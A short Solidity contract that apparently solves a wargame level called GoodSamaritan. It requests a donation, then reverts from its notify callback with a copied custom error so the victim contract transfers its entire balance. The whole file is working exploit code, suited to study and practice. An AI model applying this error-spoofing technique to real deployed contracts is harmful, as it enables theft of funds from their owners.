// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GoodSamaritan.sol";

contract AttackGoodSamaritan {
    address public victim;

    //same custom error as the contract
    error NotEnoughBalance();

    constructor(address _victim) {
        victim = _victim;
    }

    //attack the contract by requesting a donation
    function attack() public {
        GoodSamaritan(victim).requestDonation();
    }

    //the victim contract will call our notify function and we will throw the error
    function notify(uint256 amount) external pure {
        //we dont want an error when the contract send us all of the money
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
